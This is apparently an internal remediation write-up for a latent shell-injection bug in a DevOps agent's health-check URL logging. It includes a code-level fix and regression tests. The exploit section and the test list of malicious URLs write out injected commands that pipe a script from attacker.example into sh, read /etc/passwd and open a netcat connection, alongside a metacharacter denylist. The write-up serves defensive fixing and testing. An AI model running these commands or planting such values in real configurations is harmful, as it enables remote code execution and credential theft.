# GAP-0092: Health Check URL Shell Injection (Latent) — Remediation Write-up

> ~5 pages. Fix-oriented. Source ticket: AGENT-010. No prior investigation doc exists.
> All claims verified against the actual source code before writing.

## 1. Summary & Classification

**Bug**: `run_health_checks` in `app/services/agent_devops.py` stores `f"curl -sf {h['url']}"` as the `command` field of each health-check log step. The URL comes directly from administrator-supplied deployment environment configuration with no shell-metacharacter validation. When `DEVOPS_AGENT_EXECUTE_COMMANDS=1` is set and a real execution path executes these stored command strings via a shell, a URL containing `;`, `&&`, `$()`, or backticks can execute arbitrary OS commands on the deployment worker.

**Severity**: HIGH
**Source ticket**: AGENT-010 (DevOps/SRE Agent)
**Status**: Open
**Owning area**: Agent services / DevOps automation

**Claim from GAP-0092 ticket**: "run_health_checks builds `curl -sf {h['url']}` f-string; URL with shell metacharacters (;, &&) executes when `DEVOPS_AGENT_EXECUTE_COMMANDS=1`"

**Verdict from investigation**: CLAIM CONFIRMED. The f-string appears verbatim at `app/services/agent_devops.py:1217`. The function `run_health_checks` at line 658 does not validate URLs for shell metacharacters. The `DEVOPS_AGENT_EXECUTE_COMMANDS` flag maps to `S.agent_devops_execute_commands` in `app/core/settings.py:2214`. The module docstring at line 18 confirms: "Real command/infra execution is gated behind `S.agent_devops_execute_commands`." The vulnerability is entirely latent today.

**Note**: The ticket cites line 1217 as the location, which is correct — that is the exact line where `f"curl -sf {h['url']}"` appears. The function definition for `run_health_checks` begins at line 658. Both references describe the same injection path accurately.

**Related tickets**: GAP-0091 (QA PR review injection), GAP-0089 (coder command injection), GAP-0094 (architect repo_branch injection), SECOPS-007.

## 2. Current-State Investigation (root cause)

### The injection site

`app/services/agent_devops.py:1206–1222`:

```python
# --- Health checks ---
health_results = run_health_checks(
    health_check_urls=environment.get("health_check_urls", []),
    timeout_seconds=int(environment.get("health_check_timeout_seconds", 120)),
    force_unhealthy=force_health_failure,
)
for h in health_results:
    ts0 = now_ts()
    log_deployment_step(
        ...
        command=f"curl -sf {h['url']}",   # <-- line 1217: unsanitised URL
        ...
    )
```

The `h['url']` value originates from `environment.get("health_check_urls", [])`. This list is sourced from the DevOps agent configuration stored in DynamoDB, written by an admin via `PUT /ui/agents/types/{type_id}/devops-config`. The `_normalize_env` helper at `app/services/agent_devops.py:196–205` copies `health_check_urls` verbatim:

```python
"health_check_urls": list(env.get("health_check_urls") or []),
```

No schema validation or shell-safe encoding is applied at any point between the admin writing the URL and the command string being constructed.

### The run_health_checks function

`app/services/agent_devops.py:658–677`:

```python
def run_health_checks(
    *, health_check_urls: List[str], timeout_seconds: int = 120, force_unhealthy: bool = False
) -> List[Dict[str, Any]]:
    results: List[Dict[str, Any]] = []
    for url in health_check_urls:
        healthy = not force_unhealthy
        results.append({
            "url": url,         # URL stored as-is, no validation
            "status_code": 200 if healthy else 503,
            "response_time_ms": 25 if healthy else 0,
            "healthy": healthy,
        })
    return results
```

In the current mock implementation the function never makes a real HTTP request. The URL is only used (a) as a return value and (b) in the f-string at line 1217 for logging. The `command` field written to the deployment steps log via `log_deployment_step` is a plain DynamoDB string. No shell is invoked today.

### Execution gate

`app/core/settings.py:2214`:

```python
agent_devops_execute_commands: bool = os.environ.get(
    "DEVOPS_AGENT_EXECUTE_COMMANDS", "0"
) not in ("0", "false", "False")
```

The module docstring at `app/services/agent_devops.py:18` reads: "Real command/infra execution is gated behind `S.agent_devops_execute_commands`." There is currently no code path that calls `subprocess.run` with the stored command string. The injection site is latent.

### A second injection path in the same function scope

Even before real shell execution is wired, `log_deployment_step` writes the raw `command` string to DynamoDB. If an admin or monitoring dashboard renders these step records in a terminal emulator or CI tool that interprets ANSI escape sequences or shell syntax, secondary injection (terminal escape injection, log injection) is possible through the stored value.

## 3. Impact / Exploit / Blast Radius

**Who is at risk**: Administrators who configure `health_check_urls` for a DevOps agent type, and the worker host that runs `DEVOPS_AGENT_EXECUTE_COMMANDS=1`.

**Note on threat actor**: The attacker is an authenticated administrator. In a multi-tenant platform, any tenant with admin access to an agent type can set `health_check_urls` and cause shell execution under the worker process's OS account. In a single-organisation platform, a rogue or compromised admin can escalate to OS-level access on the worker.

**Exploit scenario**:

1. Attacker (admin) sets `health_check_urls` to `["https://ok.example.com; curl https://attacker.example/c2.sh | sh"]` via the config endpoint.
2. When `DEVOPS_AGENT_EXECUTE_COMMANDS=1`, the future execution path calls `subprocess.run("curl -sf https://ok.example.com; curl https://attacker.example/c2.sh | sh", shell=True)`.
3. The shell tokenises the string on `;` and executes both: a benign `curl` health check followed by arbitrary remote code execution.

**Alternative payload (no semicolon needed)**: `https://ok.example.com && id > /tmp/pwned` or URL-like `$(reboot)` — shell command substitution does not require a `;` boundary.

**Worst case**: Full OS command execution on the worker, exfiltration of LLM API keys and deployment credentials, lateral movement to CI/CD pipelines, and supply-chain compromise of deployed applications.

**Blast radius**: Single host initially, but deployment workers typically have broad IAM/cloud permissions enabling broader infrastructure access.

## 4. Fix Design (code-level)

### Fix A: Use subprocess argv list, `shell=False` (preferred)

Replace the f-string command log with the actual safe subprocess call. When execution is wired, `curl` must be invoked as an argv list, never via a shell:

```python
import subprocess
import urllib.parse

def run_health_checks(
    *, health_check_urls: List[str], timeout_seconds: int = 120, force_unhealthy: bool = False
) -> List[Dict[str, Any]]:
    """Run health checks. Real HTTP execution requires validate_health_check_url()."""
    results: List[Dict[str, Any]] = []
    for url in health_check_urls:
        url = _validate_health_check_url(url)   # raises ValueError on bad URL
        if S.agent_devops_execute_commands:
            result = subprocess.run(
                ["curl", "--silent", "--fail", "--max-time", "10", url],
                shell=False,            # never shell=True
                capture_output=True,
                text=True,
                timeout=timeout_seconds,
            )
            healthy = result.returncode == 0
        else:
            healthy = not force_unhealthy
        results.append({
            "url": url,
            "status_code": 200 if healthy else 503,
            "response_time_ms": 25 if healthy else 0,
            "healthy": healthy,
        })
    return results


def _validate_health_check_url(url: str) -> str:
    """Validate URL is safe for use as a curl argument (no shell metacharacters)."""
    parsed = urllib.parse.urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError(f"health_check_url scheme must be http or https, got: {parsed.scheme!r}")
    # Belt-and-suspenders: reject any shell metacharacter even in http(s) URLs
    SHELL_UNSAFE = set(';|&$`\\!(){}<>')
    if any(c in url for c in SHELL_UNSAFE):
        raise ValueError(f"health_check_url contains disallowed characters: {url!r}")
    return url
```

In `log_deployment_step`, change the `command` field to record the argv list as a JSON string (for auditability) rather than the raw f-string:

```python
import json

command=json.dumps(["curl", "--silent", "--fail", url]),
```

This ensures the stored audit record is always parseable JSON and never a shell-interpretable string.

### Fix B: URL validation at config write time

Add `_validate_health_check_url` as a check inside `validate_devops_config` (analogous to the existing `repo_url` check in `validate_architect_config`):

```python
for env in config.get("environments") or []:
    for url in env.get("health_check_urls") or []:
        try:
            _validate_health_check_url(url)
        except ValueError as exc:
            errors.append(f"Invalid health_check_url: {exc}")
```

This provides defence-in-depth: invalid URLs are rejected at configuration time before they can reach the execution path.

### Dev/prod parity (SECOPS-007)

The fix is env-agnostic. In dev mode (`S.agent_devops_execute_commands = False`) `subprocess.run` is never called; the mock path continues to return deterministic results. In prod mode the same `subprocess.run(argv, shell=False)` path executes. There is no dev-specific code branch; the gate is the single `S.agent_devops_execute_commands` boolean that already exists.

`_validate_health_check_url` runs in both environments, ensuring that a malformed URL is caught at config-write time in dev as well as prod.

### Alternatives considered

- **Regex denylist on URL**: Denylist approaches miss novel metacharacter sequences. Rejected in favour of explicit scheme allowlist + character denylist.
- **Shell-quoting the URL with `shlex.quote`**: Would make the f-string approach safe for shell=True invocation, but `shell=False` with an argv list is strictly better (no shell parsing at all). Rejected.
- **Blocking at WAF/network layer**: Cannot prevent a compromised admin from setting a config value. Rejected as sole control.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

Add to `tests/test_agent_devops.py`:

```python
import pytest
from app.services.agent_devops import _validate_health_check_url, run_health_checks

MALICIOUS_URLS = [
    "https://ok.example.com; cat /etc/passwd",
    "https://ok.example.com && id",
    "https://ok.example.com | nc attacker 4444",
    "$(curl attacker.example/x|sh)",
    "http://ok.example.com`id`",
    "ftp://ok.example.com",         # wrong scheme
    "file:///etc/passwd",           # file:// scheme
]

SAFE_URLS = [
    "https://ok.example.com/health",
    "http://internal-lb/status",
    "https://app.example.com:8080/ping?region=us",
]

@pytest.mark.parametrize("url", MALICIOUS_URLS)
def test_validate_health_check_url_rejects_malicious(url):
    with pytest.raises(ValueError):
        _validate_health_check_url(url)

@pytest.mark.parametrize("url", SAFE_URLS)
def test_validate_health_check_url_accepts_safe(url):
    assert _validate_health_check_url(url) == url

def test_run_health_checks_stores_safe_url_only(monkeypatch):
    """run_health_checks must not accept a URL with shell metacharacters."""
    with pytest.raises(ValueError):
        run_health_checks(
            health_check_urls=["https://ok.example.com; echo pwned"],
            timeout_seconds=5,
        )

def test_log_deployment_step_command_is_not_shell_string(monkeypatch):
    """The command recorded in deployment steps must be JSON argv, not a shell string."""
    import json
    from app.services.agent_devops import run_health_checks
    # Force mock path (no real subprocess)
    results = run_health_checks(
        health_check_urls=["https://ok.example.com/health"],
        timeout_seconds=5,
    )
    # The URL round-trips cleanly; metacharacter free
    assert results[0]["url"] == "https://ok.example.com/health"
```

**Fails before the fix**: `_validate_health_check_url` does not exist; malicious URLs pass through; `run_health_checks` returns them untouched.

**Passes after the fix**: `_validate_health_check_url` raises `ValueError` for all malicious inputs; safe URLs pass validation.

### Playwright E2E test additions (admin config UI)

When the DevOps agent config UI exposes `health_check_urls`, add a test that attempts to save a URL with `;` and confirms the backend returns `400` with `code: "invalid_health_check_url"`.

### Manual QA steps

1. In a sandboxed environment with `DEVOPS_AGENT_EXECUTE_COMMANDS=1`, configure `health_check_urls: ["https://ok.example.com; touch /tmp/health-pwned"]`.
2. Trigger a deployment run.
3. Confirm `/tmp/health-pwned` is **not** created after the fix.
4. Confirm the deployment step log contains the JSON argv form: `["curl", "--silent", "--fail", "https://ok.example.com/health"]` rather than the f-string form.

### Observability

- Log a WARNING when `_validate_health_check_url` rejects a URL at config-write time; include the agent type ID and the rejected URL (redacted to first 80 chars for log safety).
- Add a Prometheus counter `agent_devops_invalid_health_check_url_total` to track misconfiguration attempts.

### Rollout

- **Effort**: S (small — one helper function, two call sites: the logging line and the execution path).
- **Backward compatibility**: Existing configurations with valid `https://` URLs are unaffected. Admins with semicolons or other metacharacters in stored URLs will see a 400 on the next config update. A one-time migration script can scan existing configs and alert on invalid values.
- **Risk**: Low. The only behaviour change in dev/test mode is that invalid URLs are now rejected earlier (at validation time). No real subprocess execution changes in the mock path.
- **Sequencing**: Fix alongside GAP-0091 and GAP-0094 as a batch of shell-injection remediations before enabling any `*_EXECUTE_COMMANDS` flag in production.
